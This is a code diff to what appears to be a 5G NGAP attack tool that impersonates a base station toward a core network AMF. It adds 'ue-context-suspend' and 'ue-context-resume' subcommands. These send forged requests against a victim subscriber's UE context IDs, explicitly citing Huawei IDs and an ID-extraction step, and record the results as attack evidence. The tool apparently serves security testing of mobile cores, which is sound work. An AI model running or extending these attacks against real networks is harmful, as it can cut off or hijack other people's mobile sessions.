@@ -400,6 +400,34 @@ def cmd_pdu_notify(gnb, a):
     _listen_after(gnb, a, "pdu-notify")
 
 
+def cmd_ue_context_suspend(gnb, a):
+    """Class-1 UE Context Suspend. Reply is Response or Failure."""
+    sessions = parse_sessions(a.pdu_sessions)
+    print(f"[ue-context-suspend] amf={a.amf_ue_id} ran={a.ran_ue_id} "
+          f"pdu={sessions} proc=59")
+    r = gnb.send(B.ue_context_suspend_request(
+        a.amf_ue_id, a.ran_ue_id, pdu_sessions=sessions))
+    print(f"[ue-context-suspend] reply: {ngap.summarize(r) if r else '(no reply)'}")
+    _save(a.evidence, {"attack": "ue-context-suspend",
+                       "amf_ue_id": a.amf_ue_id, "ran_ue_id": a.ran_ue_id,
+                       "pdu_sessions": sessions,
+                       "reply": ngap.message_type(r) if r else None})
+
+
+def cmd_ue_context_resume(gnb, a):
+    """Class-1 UE Context Resume. Reply is Response or Failure."""
+    sessions = parse_sessions(a.pdu_sessions)
+    print(f"[ue-context-resume] amf={a.amf_ue_id} ran={a.ran_ue_id} "
+          f"pdu={sessions} proc=58")
+    r = gnb.send(B.ue_context_resume_request(
+        a.amf_ue_id, a.ran_ue_id, pdu_sessions=sessions))
+    print(f"[ue-context-resume] reply: {ngap.summarize(r) if r else '(no reply)'}")
+    _save(a.evidence, {"attack": "ue-context-resume",
+                       "amf_ue_id": a.amf_ue_id, "ran_ue_id": a.ran_ue_id,
+                       "pdu_sessions": sessions,
+                       "reply": ngap.message_type(r) if r else None})
+
+
 def cmd_pdu_modify_ind(gnb, a):
     """Class-1 Modify Indication: advertise a new downlink NG-U endpoint."""
     from .cases_p05_p09 import pdu_session_resource_modify_indication
@@ -1036,6 +1064,15 @@ def main():
                    help="with --release: ngran, or group:name "
                         "(default radioNetwork:radio-connection-with-ue-lost)")
 
+    for name, help_text in (
+            ("ue-context-suspend", "UE Context Suspend Request (proc 59)"),
+            ("ue-context-resume", "UE Context Resume Request (proc 58)")):
+        s = sub.add_parser(name, help=help_text)
+        s.add_argument("--amf-ue-id", type=int, required=True)
+        s.add_argument("--ran-ue-id", type=int, default=99,
+                       help="Huawei: victim RAN-UE-NGAP-ID from extract-ue-ids")
+        s.add_argument("--pdu-sessions", default="1")
+
     s = sub.add_parser("pdu-modify-ind")
     s.add_argument("--amf-ue-id", type=int, required=True)
     s.add_argument("--ran-ue-id", type=int, default=99,
@@ -1135,6 +1172,8 @@ def main():
      "ho-window-inject": cmd_ho_window_inject,
      "pdu-notify": cmd_pdu_notify,
      "pdu-modify-ind": cmd_pdu_modify_ind,
+     "ue-context-suspend": cmd_ue_context_suspend,
+     "ue-context-resume": cmd_ue_context_resume,
      "retrieve-ue-info": cmd_retrieve_ue_info,
      "handover-notify": cmd_handover_notify,
      "ul-nrppa": cmd_nrppa,
